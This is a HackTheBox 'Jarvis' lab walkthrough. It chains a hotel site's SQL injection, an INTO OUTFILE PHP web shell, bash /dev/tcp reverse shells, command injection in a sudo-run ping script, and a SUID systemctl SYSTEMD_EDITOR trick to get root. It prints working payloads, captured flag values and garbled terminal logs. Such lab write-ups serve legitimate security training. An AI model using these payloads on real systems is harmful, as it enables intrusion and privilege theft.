---
tags: [HTB, Jarvis, Linux, Apache, SQLi, CommandInjection, SUID, Systemctl, Medium]
platform: HackTheBox
os: Linux
hostname: jarvis
difficulty: Medium
ip: $BoxIP
status: Complete
domain: None
---

# HTB: Jarvis, Full Walkthrough

## The gist

Jarvis runs an Apache-hosted Stark Hotel application with a numeric SQL injection in the room lookup parameter. Manual UNION extraction showed that MariaDB could write a PHP command shell into the web root, giving a www-data foothold. That account could run a vulnerable ping utility as pepper, whose command injection led to a shell as pepper. A root-owned SUID systemctl was then abused through SYSTEMD_EDITOR to create a SUID Bash binary and obtain root.

## Box information

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux, Debian |
| Hostname | jarvis |
| Domain | None |
| Difficulty | Medium |
| IP | $BoxIP |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service and version scan | See section 3 below |
| 4 | Web reconnaissance and WAF behaviour | See section 4 below |
| 5 | Confirm the numeric SQL injection | See section 5 below |
| 6 | Map UNION columns and enumerate MariaDB | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Jarvis`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

~~~bash
boxset BoxName Jarvis
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset Domain ''
boxset WebPort 80
boxset Port 4444
boxset Username www-data
boxset Username2 pepper
~~~

No passwords, hashes, or flag values are stored in this write-up.

## 1. Workspace setup

I started with the Kali helper so the box directory, variables, loot folders, screenshot folder, and session log were available before reconnaissance. htblog captured terminal output as well as commands, preserving callbacks, errors, and failed attempts for review.

~~~bash
source ~/.zshrc
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Jarvis
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset WebPort 80
boxset Port 4444
~~~

![](<file:///home/kali/Platforms/Offsec/Cockpit/screenshots/0.boxstart.png>)
SCREENSHOT: Box workspace initialisation and captured session.

## 2. Full TCP scan

A full TCP scan prevents a non-standard service from being missed. -Pn skips ICMP discovery, -n avoids DNS lookups, -sT uses a TCP connect scan when raw SYN sockets are unavailable, and -p- checks every TCP port. -oA saves normal, grepable, and XML results for later reference.

~~~bash
sudo nmap -sT -Pn -n -p- --min-rate 10000 "$BoxIP" -oA "$BoxDir/nmap/${BoxName}_allports"
~~~

The scan found SSH, the main web service, and a second HTTP service:

~~~text
22/tcp     open  ssh
80/tcp     open  http
64999/tcp  open  unknown
~~~

![](<file:///home/kali/Platforms/HackTheBox/Mirai/screenshots/1.nmap-allports.png>)
SCREENSHOT: Full TCP scan showing ports 22, 80, and 64999.

## 3. Service and version scan

The focused scan identifies product versions and runs Nmap's standard scripts. -sC gathers default-script details such as HTTP titles and SSH host keys, while -sV performs service version detection. Limiting the scan to discovered ports keeps the output focused.

~~~bash
nmap -sT -Pn -sC -sV -p 22,80,64999 "$BoxIP" -oA "$BoxDir/nmap/${BoxName}_services"
~~~

The important results were Apache 2.4.25 on Debian and the Stark Hotel title on port 80. Port 64999 also served Apache but had no useful title.

> [!warning] 💡 Hint
> A second HTTP service with a different response is still part of the web attack surface. Compare titles, headers, and behavior before deciding whether it is a duplicate, a WAF, or a separate virtual host.

~~~text
22/tcp     open  ssh   OpenSSH 7.4p1 Debian 10+deb9u6
80/tcp     open  http  Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
64999/tcp  open  http  Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title
Service Info: OS: Linux
~~~

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/2.nmap-svcscan.png>)
SCREENSHOT: Focused service scan showing SSH, Apache, and the Stark Hotel title.

## 4. Web reconnaissance and WAF behaviour

The main page should be read before broad content discovery because source code and links often reveal the intended route. The response exposed supersecurehotel.htb, the Stark Hotel application, and an IronWAF header. Repeated or aggressive requests caused a 90-second ban, so enumeration stayed manual and low-rate.

~~~bash
curl -i --max-time 15 "http://$BoxIP/" | tee "$BoxDir/loot/http_root_full.txt"
curl -i --max-time 15 "http://$BoxIP:64999/" | tee "$BoxDir/loot/http_64999_full.txt"
~~~

The main response identified Apache, IronWAF 2.0.3, and Stark Hotel. Port 64999 returned the WAF message instead of a second application. The room listing then supplied room.php?cod=1 through room.php?cod=6, making cod the first parameter to test.

~~~bash
curl -sS --max-time 15 "http://$BoxIP/rooms-suites.php" | tee "$BoxDir/loot/rooms-suites-full.html" >/dev/null
grep -nEi 'room.php|cod=' "$BoxDir/loot/rooms-suites-full.html" | head -10
~~~

I did not continue with a high-thread Gobuster run after the ban response because the relevant route was already exposed and additional requests risked another delay.

> [!tip] ⚡ Efficiency
> Following the room links in the saved HTML was faster and quieter than brute-forcing the entire site after the WAF had already demonstrated its request threshold.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/3.http-recon.png>)
SCREENSHOT: Stark Hotel response and source showing the hostname and application. Red = hostname and application; green = response context.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/5.port64999-ironWAF.png>)
SCREENSHOT: Port 64999 returning the IronWAF ban response. Red = ban message; green = HTTP and WAF headers.

## 5. Confirm the numeric SQL injection

The room parameter is numeric, so a boolean false condition should return no room. --data-urlencode preserves spaces and SQL punctuation, while -G places the encoded value in the query string. A 200 status alone is not proof, so I compared the returned room fields with a normal request.

~~~bash
curl -sS --max-time 15 -D - -o "$BoxDir/loot/room_cod_false.html" "http://$BoxIP/room.php?cod=1%20AND%201=2"
grep -nE 'room.php|price-room' "$BoxDir/loot/room_cod_false.html" | head -5
~~~

The false condition returned empty room fields, including an empty room link and price, while the normal numeric value returned a populated room. This confirmed that the parameter was being evaluated in the database query.

> [!abstract] 🧠 Why
> A successful SQLi test is a change in application behavior, not simply a `200` response. Comparing a normal value with a false condition reduces the chance of mistaking a generic error page for injection.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/6.cod%3D-integer-param-db.png>)
SCREENSHOT: Normal numeric cod request identifying the database-backed parameter. Red = room.php and cod; green = normal populated response.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/7.sqli-room-cod-false.png>)
SCREENSHOT: False boolean condition changing the room response. Red = empty room fields; green = the submitted false condition.

## 6. Map UNION columns and enumerate MariaDB

UNION extraction requires the same number of columns as the original query. I submitted seven numbered values and observed where they appeared in the HTML. The second value rendered as the room name, the third as the price, the fourth as the description, the fifth as the star rating, and the sixth as the image path, so column two was the visible extraction column.

~~~bash
curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -" -o "$BoxDir/loot/room_union7_false.html"
sed -n '104,118p' "$BoxDir/loot/room_union7_false.html"
~~~

The seven-column UNION was accepted:

~~~text
<h3><a href="/room.php?cod=1">2</a></h3>
<span class="price-room">3</span>
<p>4</p>
~~~

I then queried the database version, current schema, tables, and columns. information_schema is MariaDB's metadata database, and GROUP_CONCAT combines multiple names into one visible value.

~~~bash
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,@@version,3,4,5,6,7-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,database(),3,4,5,6,7-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='room'-- -" | grep -nE '<h3>'
~~~

The results identified MariaDB, the hotel database, the room table, and the columns cod, name, price, descrip, star, image, and mini. A user() query identified DBadmin@localhost as the database execution account. secure_file_priv was empty, so a server-side file write was worth testing.

> [!warning] 💡 Common mistake
> Do not jump from UNION output straight to `INTO OUTFILE`. Confirm the visible column, database account, server-side file restrictions, and a writable web path first. Each condition is independent.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/8.sqli-union-columns.png>)
SCREENSHOT: Seven-column UNION mapping with visible output. Red = visible column mapping; green = the surrounding HTML template.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/9.database-enum.png>)
SCREENSHOT: MariaDB version, schema, table, and column enumeration. Red = extracted metadata; green = the UNION request context.

## 7. Write a PHP command shell with INTO OUTFILE

MariaDB INTO OUTFILE writes query output to a server-side path when the database account has FILE privilege and the destination is writable. I used a negative room identifier so the original query returned no normal row, then placed PHP code in the visible name column. The hex form avoids quote and punctuation problems inside nested SQL and URL syntax.

~~~bash
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'-- -" -o "$BoxDir/loot/sqli_outfile.html"
~~~

The hex decodes to:

~~~php
<?php system($_GET["cmd"]); ?>
~~~

I verified execution with the harmless id command before attempting a callback.

~~~bash
curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=id" | tee "$BoxDir/loot/shell_id.txt"
~~~

The response showed execution as www-data.

> [!tip] ⚡ Efficiency
> Use the command shell to prove identity and inspect the next boundary before building a callback. The HTTP channel is also a fallback if reverse-shell egress or terminal stability becomes a problem.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/10.foothold.png>)
SCREENSHOT: PHP shell responding to id as www-data. Red = uid and account; green = the web-shell response.

## 8. Catch and stabilise the web-shell callback

A reverse shell connects from the target back to Kali, so the listener must be ready before the HTTP request launches Bash. /dev/tcp is Bash-specific syntax; bash -c ensures the command is interpreted by Bash. The HTTP request may time out after the callback takes over because the PHP process remains attached to the shell.

~~~bash
boxset Port 4444
nc -lvnp $Port
~~~

From a second terminal, I sent the callback through the confirmed PHP command parameter:

~~~bash
curl -sS --max-time 15 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" -o "$BoxDir/loot/www_callback_trigger.txt"
~~~

A raw netcat shell has no pseudo-terminal, so job control and full-screen tools do not behave normally. Python's pty module creates a pseudo-terminal, stty raw -echo; fg restores the suspended connection with local echo disabled, and TERM tells terminal programs which capabilities are available.

~~~bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z in the listener terminal
stty raw -echo; fg
export TERM=xterm
whoami
id
hostname
pwd
~~~

The stable foothold was www-data on jarvis in /var/www/html.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/11.revshell-req.png>)
SCREENSHOT: Callback request and listener connection. Red = callback connection; green = listener context.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/12.revshell-stable-foothold.png>)
SCREENSHOT: Stabilised www-data shell. Red = shell identity; green = hostname and working-directory context.

## 9. Discover the sudo transition

With a usable shell, I checked the current account's sudo policy before broad local enumeration. sudo -l lists permitted commands and shows whether a password is required. The result gave www-data a passwordless transition to pepper through one fixed Python script.

~~~bash
sudo -l
ls -l /var/www/Admin-Utilities/simpler.py
~~~

Relevant output:

~~~text
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
-rwxr--r-- 1 pepper pepper ... /var/www/Admin-Utilities/simpler.py
~~~

The script was readable, so I inspected its source rather than treating the sudo rule as a black box.

> [!abstract] 🧠 Why
> A sudo rule defines the allowed entry point, not the exploit. Source review reveals which arguments reach a shell, what filters are applied, and whether command substitution or another parser mismatch remains.

~~~bash
sed -n '1,220p' /var/www/Admin-Utilities/simpler.py
~~~

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/13.privesc-finding.png>)
SCREENSHOT: Passwordless sudo rule allowing www-data to run simpler.py as pepper. Red = NOPASSWD rule; green = command and account context.

## 10. Exploit command injection in simpler.py

The -p option reads an attacker-controlled IP and passes it to os.system() after prepending ping. The blacklist removes common separators such as &, ;, backticks, and pipes, but it does not remove command substitution. A $(...) expression is evaluated by the shell while the ping command is built, providing code execution without a blocked separator.

The vulnerable function was:

~~~python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
~~~

I staged a Bash callback as www-data, then supplied 127.0.0.1$(bash /tmp/rev.sh) to the script. The backslash before the command substitution is important because it prevents the local shell from evaluating it before the request reaches the target.

~~~bash
boxset Username2 pepper
boxset Port 4445
curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\\n' 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' > /tmp/rev.sh; chmod +x /tmp/rev.sh" -o "$BoxDir/loot/stage_rev_shell.txt"
nc -lvnp $Port
~~~

From a second terminal, I triggered the vulnerable script:

~~~bash
curl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\\n' '127.0.0.1\$(bash /tmp/rev.sh)' | sudo -u $Username2 /var/www/Admin-Utilities/simpler.py -p" -o "$BoxDir/loot/pepper_callback_trigger.txt" &
~~~

The callback arrived as pepper.

> [!warning] 💡 Gotcha
> A callback request normally times out after the remote shell takes over. If the listener terminal is suspended while upgrading the raw shell, restage the callback, keep the listener open, and launch the final HTTP trigger in the background.

> [!tip] 🛠️ Alternative tools
> If command substitution is filtered differently, use a harmless file-write marker first, then test another shell syntax or interpreter. Keep the original HTTP shell available for recovery.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/14.vulnerable-function.png>)
SCREENSHOT: exec_ping() showing the incomplete blacklist and unsafe os.system() call. Red = unsafe concatenation; green = the filtering context.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/15.privesc-finding.png>)
SCREENSHOT: Command-injection input and the pepper callback. Red = injected command and callback account; green = listener context.

## 11. Enumerate SUID programs as pepper

After changing users, I repeated identity checks and searched for SUID files. SUID means a program runs with the file owner's effective permissions, so a root-owned SUID administrative binary is a high-priority candidate. The -printf format records mode, owner, and path in one line, while 2>/dev/null suppresses permission errors.

~~~bash
id
whoami
hostname
find / -type f -perm -4000 -printf '%m %u %p\\n' 2>/dev/null | sort -n
~~~

The unusual result was:

~~~text
4750 root /bin/systemctl
~~~

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/16.foothold.png>)
SCREENSHOT: pepper shell identity after the sudo-script pivot. Red = account identity; green = host context.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/17.privesc-finding.png>)
SCREENSHOT: SUID enumeration highlighting root-owned systemctl. Red = 4750 root-owned binary; green = surrounding SUID results.

## 12. Use the SUID systemctl editor path

The usual temporary-unit technique writes a service file and calls systemctl link followed by systemctl enable --now. On this older systemd build that route failed with a missing-file error, so I used the editor path instead. systemctl edit creates a temporary override and launches an editor. Because the SUID systemctl retains effective root privileges, SYSTEMD_EDITOR can point to a controlled script that runs as root.

The failed service-unit attempt was:

~~~bash
printf '%s\\n' '[Unit]' 'Description=Jarvis study service' '[Service]' 'Type=oneshot' 'ExecStart=/bin/sh -c "cp /bin/bash /tmp/jarvis-bash; chmod 4755 /tmp/jarvis-bash"' '[Install]' 'WantedBy=multi-user.target' > /tmp/jarvis-root.service
systemctl link /tmp/jarvis-root.service
systemctl enable --now /tmp/jarvis-root.service
~~~

The host returned:

~~~text
Failed to link unit: No such file or directory
Failed to enable unit: File /tmp/jarvis-root.service: No such file or directory
~~~

The working editor script copies Bash to a temporary path and applies the SUID bit. script -qc supplies a pseudo-terminal for systemctl edit, while /dev/null provides empty editor input.

~~~bash
printf '%s\\n' '#!/bin/sh' 'cp /bin/bash /tmp/jarvis-bash' 'chmod 4755 /tmp/jarvis-bash' > /tmp/jarvis-editor.sh
chmod +x /tmp/jarvis-editor.sh
script -qc 'SYSTEMD_EDITOR=/tmp/jarvis-editor.sh systemctl edit basic.target' /dev/null 2>&1
ls -l /tmp/jarvis-bash
~~~

The command reported that editing override.conf was canceled because the temporary file was empty, but the editor script had already executed. The resulting file was root-owned and SUID:

~~~text
-rwsr-xr-x 1 root pepper ... /tmp/jarvis-bash
~~~

Run Bash with -p so it preserves the effective UID instead of dropping the SUID privilege.

~~~bash
/tmp/jarvis-bash -p -c 'id; whoami; hostname'
~~~

The result showed euid=0, root, and hostname jarvis.

> [!warning] 💡 Hint
> The failed service-unit attempt is useful evidence, not wasted work. Record the exact error, preserve the SUID finding, and change only the systemctl subcommand or editor path instead of restarting privilege enumeration from zero.

> [!abstract] 🧠 Why
> `SYSTEMD_EDITOR` is evaluated by the editor path while the SUID systemctl retains effective root privileges. The editor script is therefore the payload, and the temporary-file warning does not necessarily mean the editor script failed.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/18.privesc-exploit.png>)
SCREENSHOT: SYSTEMD_EDITOR execution and SUID Bash creation. Red = editor path and SUID helper; green = systemctl output.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/19.root-shell.png>)
SCREENSHOT: Root identity confirmed through the SUID Bash helper. Red = euid 0 and root; green = hostname context.

## 13. Confirm flags privately

The proof files were checked from the root-capable Bash helper. I recorded only that each file was present and non-empty; their contents were not displayed in this write-up.

~~~bash
/tmp/jarvis-bash -p -c 'test -s /home/pepper/user.txt && echo user_flag_present; test -s /root/root.txt && echo root_flag_present'
~~~

~~~text
user_flag_present
root_flag_present
~~~

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/20.flags.png>)
SCREENSHOT: User and root proof checks with values hidden. Red = presence checks; green = the root-capable shell context.

## 14. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| WAF reacts to request volume | Follow links from saved HTML | Slow, scoped content discovery or a second HTTP port |
| Numeric parameter changes response content | Manual boolean and UNION testing | Use an SQLi helper after preserving the exact request structure |
| `INTO OUTFILE` is possible | Write a minimal PHP command shell | Extract data through UNION if the webroot is not writable |
| Sudo script has a blacklist | Trace the shell parser for substitutions | Test a marker or another interpreter before a reverse shell |
| SUID systemctl unit path fails | Use the editor path and preserve the failure evidence | Recheck binary version, SUID state, and temporary-file behavior |

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/21.proof-shot.png>)
SCREENSHOT: Root proof and final verification without exposing flag contents. Red = proof state; green = identity context.

![](<file:///home/kali/Platforms/HackTheBox/Jarvis/screenshots/22.cleandown.png>)
SCREENSHOT: Target-side payload cleanup and final 404 verification. Red = cleanup result and 404; green = command context.

## 15. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
- [[RUNBOOK V2/Linux - SQLi|Step 8 - Linux SQLi]]
- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
- [[RUNBOOK V2/Linux - Command Injection|Step 8A - Linux Command Injection]]
- [[RUNBOOK V2/Linux - SUID Check|Step 15 - Linux SUID Check]]
- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]

## 16. Collect the flags

- user.txt: confirmed at /home/pepper/user.txt; value captured in the private flag section
- root.txt: confirmed at /root/root.txt; value captured in the private flag section
- proof.txt: not applicable to this box


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: b6b395e0f4f02a513f12fa89ab824866
root: e168a89962e557d382ff182aa03b80d6
```

## 17. Clean down
Cleanup removes the web shell, staged reverse-shell scripts, SUID Bash helper, and temporary systemd override. The final HTTP request confirms that the web root no longer serves the PHP command shell.

~~~bash
/tmp/jarvis-bash -p -c 'rm -f /var/www/html/shell.php /tmp/rev.sh /tmp/jarvis-root.service /tmp/jarvis-editor.sh /tmp/jarvis-bash /etc/systemd/system/jarvis-root.service /etc/systemd/system/basic.target.d/override.conf; rmdir /etc/systemd/system/basic.target.d 2>/dev/null || true'
curl -sS --max-time 10 -o /dev/null -w 'shell.php status=%{http_code}\\n' "http://$BoxIP/shell.php"
boxdone
~~~

The endpoint returned 404, confirming that the web shell was removed. The local transcript and loot were retained in $BoxDir before boxdone cleared the active marker.

> [!warning] 💡 Common mistake
> Remove the webshell, callback script, temporary editor, SUID copy, and any FIFO before closing the privileged shell. Verify both the HTTP response and filesystem state instead of assuming a timed command completed.

### Completion checklist

- [x] Context and write-up requirements read
- [x] Helper workspace initialised
- [x] Full TCP scan completed
- [x] Service versions identified
- [x] Stark Hotel web application enumerated
- [x] IronWAF behaviour recorded
- [x] Numeric SQL injection confirmed
- [x] UNION column count and visible fields mapped
- [x] MariaDB schema enumerated manually
- [x] PHP web shell written with INTO OUTFILE
- [x] www-data foothold confirmed
- [x] Sudo transition to pepper confirmed
- [x] simpler.py command injection confirmed
- [x] Root-owned SUID systemctl identified
- [x] Root shell obtained through SYSTEMD_EDITOR
- [x] User and root proof paths confirmed without displaying values
- [x] Target-side artifacts removed and web shell verified with 404
- [x] boxdone run

## 18. Attack narrative in one page
1. Full TCP reconnaissance identified SSH, Apache, and the non-standard HTTP service.
2. Stark Hotel room links exposed the numeric cod parameter, and a false boolean condition confirmed SQL injection.
3. A seven-column UNION mapped visible fields and enumerated the MariaDB schema.
4. INTO OUTFILE wrote a PHP command shell into the Apache web root, producing a www-data foothold.
5. A passwordless sudo rule allowed www-data to run simpler.py as pepper.
6. exec_ping() passed untrusted input to os.system(), and command substitution produced the pepper shell.
7. SUID enumeration found root-owned /bin/systemctl.
8. The SUID editor path created a root-owned SUID Bash helper, which provided root execution with -p.
9. Proof files were confirmed privately and all target-side payloads were removed.

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `nc`
- `netcat`
- `ssh`
- `sudo`
- `python`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| DBadmin@localhost | MariaDB user() output | Database execution context; no password recovered |
| www-data | PHP shell identity | Initial web-service foothold |
| pepper | Passwordless sudo rule for simpler.py | Second-stage shell and SUID enumeration |
| root | SUID systemctl editor path | Final privileged access |

No passwords or hashes were recovered or stored in this write-up.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Jarvis"
export BoxIP="10.129.1.73"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Jarvis"
export Domain=""
export DCip=""
export Username="www-data"
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
| http-cookie-flags:
Set-Cookie: PHPSESSID=ij0cb0chfccf73t4cdql937525; path=/
Set-Cookie: PHPSESSID=2fi07d8mcpkre5a5l0qqfvm6f2; path=/
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
$ [10:45:35] loot flag user b6b395e0f4f02a513f12fa89ab824866
kali@kali:~/Platforms/HackTheBox/Jarvis [10:34:20] $ llloloootloott t flag user b6b395e0f4f02a513f12fa89ab824866[?1l>[?2004l
[+] Flag saved:  user = b6b395e0f4f02a513f12fa89ab824866  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Jarvis [10:45:35] $ [?1h=[?2004hloot flag user b6b395e0f4f02a513f12fa89ab824866loot 6  66   866    4866     24866      824866       b824866        ab824866         9ab824866          89ab824866           a89ab824866            fa89ab824866             2fa89ab824866              12fa89ab824866               f12fa89ab824866                3f12fa89ab824866                 13f12fa89ab824866                  513f12fa89ab824866                   a513f12fa89ab824866                    2a513f12fa89ab824866                     02a513f12fa89ab824866                      f02a513f12fa89ab824866                       4f02a513f12fa89ab824866                        f4f02a513f12fa89ab824866                         0f4f02a513f12fa89ab824866                          e0f4f02a513f12fa89ab824866                           5e0f4f02a513f12fa89ab824866                            95e0f4f02a513f12fa89ab824866        
$ [10:45:49] loot flag root e168a89962e557d382ff182aa03b80d6
[sudo] password for pepper:
sudo: 3 incorrect password attempts
4755 root /usr/bin/gpasswd
4755 root /usr/bin/passwd
$ [10:48:12] cat $BoxDir/loot/flags.txt
[+] Flag saved:  root = e168a89962e557d382ff182aa03b80d6  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Jarvis [10:45:49] $ [?1h=[?2004hcat $BoxDir/loot/flags.txt
```

### Additional captured source values

#### `loot/http_root_full.txt`

```text
HTTP/1.1 200 OK
Date: Fri, 04 Sep 2026 09:02:34 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=ij0cb0chfccf73t4cdql937525; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
IronWAF: 2.0.3
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<!DOCTYPE HTML>
<html>
	<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Stark Hotel</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="" />
	<meta name="keywords" content="" />
	<meta name="author" content="" />

  <!-- Facebook and Twitter integration -->
	<meta property="og:title" content=""/>
	<meta property="og:image" content=""/>
	<meta property="og:url" content=""/>
	<meta property="og:site_name" content=""/>
	<meta property="og:description" content=""/>
	<meta name="twitter:title" content="" />
	<meta name="twitter:image" content="" />
	<meta name="twitter:url" content="" />
	<meta name="twitter:card" content="" />



	<!-- Animate.css -->
	<link rel="stylesheet" href="css/animate.css">
	<!-- Icomoon Icon Fonts-->
	<link rel="stylesheet" href="css/icomoon.css">
	<!-- Bootstrap  -->
	<link rel="stylesheet" href="css/bootstrap.css">

	<!-- Magnific Popup -->
	<link rel="stylesheet" href="css/magnific-popup.css">

	<!-- Flexslider  -->
	<link rel="stylesheet" href="css/flexslider.css">

	<!-- Owl Carousel -->
	<link rel="stylesheet" href="css/owl.carousel.min.css">
	<link rel="stylesheet" href="css/owl.theme.default.min.css">

	<!-- Date Picker -->
	<link rel="stylesheet" href="css/bootstrap-datepicker.css">
	<!-- Flaticons  -->
	<link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">

	<!-- Theme style  -->
	<link rel="stylesheet" href="css/style.css">

	<!-- Modernizr JS -->
	<script src="js/modernizr-2.6.2.min.js"></script>
	<!-- FOR IE9 below -->
	<!--[if lt IE 9]>
	<script src="js/respond.min.js"></script>
	<![endif]-->

	</head>
	<body>

	<div class="colorlib-loader"></div>

	<div id="page">
		<nav class="colorlib-nav" role="navigation">
			<div class="top">
				<div class="container">
					<div class="row">
						<div class="col-xs-4">
							<p class="site">supersecurehotel.htb</p>
						</div>
						<div class="col-xs-8 text-right">
							<p class="num">Call: +123456789</p>
							<ul class="colorlib-social">
                <li><a href="#">Sign in </li>                <li><a href="#">Utilities</a></li>
								<li><a href="#"><i class="icon-twitter"></i></a></li>
								<li><a href="#"><i class="icon-facebook"></i></a></li>
								<li><a href="#"><i class="icon-linkedin"></i></a></li>
								<li><a href="#"><i class="icon-dribbble"></i></a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
			<div class="top-menu">
				<div class="container">
					<div class="row">
						<div class="col-xs-2">
							<div id="colorlib-logo"><a href="index.php">Stark Hotel</a></div>
						</div>
						<div class="col-xs-10 text-right menu-1">
							<ul>
								<li class="active"><a href="index.php">Home</a></li>
								<li class="has-dropdown">
									<a href="rooms-suites.php">Rooms</a>
								</li>
								<li><a href="dining-bar.php">Dining &amp; Bar</a></li>

							</ul>
						</div>
					</div>
				</div>
			</div>
		</nav>
		<aside id="colorlib-hero">
			<div class="flexslider">
				<ul class="slides">
				<li style="background-image: url(images/img_bg_5.jpg);">
					<div class="overlay"></div>
					<div class="container-fluid">
						<div class="row">
							<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
								<div class="slider-text-inner text-center">
									<h2>Welcome to the Stark Hotel</h2>
									<h1>A Luxury Hotel</h1>
										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
								</div>
							</div>
						</div>
					</div>
				</li>
				<li style="background-image: url(images/img_bg_1.jpg);">
					<div class="overlay"></div>
					<div class="container-fluid">
						<div class="row">
							<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
								<div class="slider-text-inner text-center">
									<h2>Discover &amp; Enjoy</h2>
									<h1>Everything you need in Stark Hotel</h1>
										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
								</div>
							</div>
						</div>
					</div>
				</li>
				<li style="background-image: url(images/img_bg_3.jpg);">
					<div class="overlay"></div>
					<div class="container-fluids">
						<div class="row">
							<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
								<div class="slider-text-inner text-center">
									<h2>You are invited</h2>
									<h1>We know how to please you</h1>
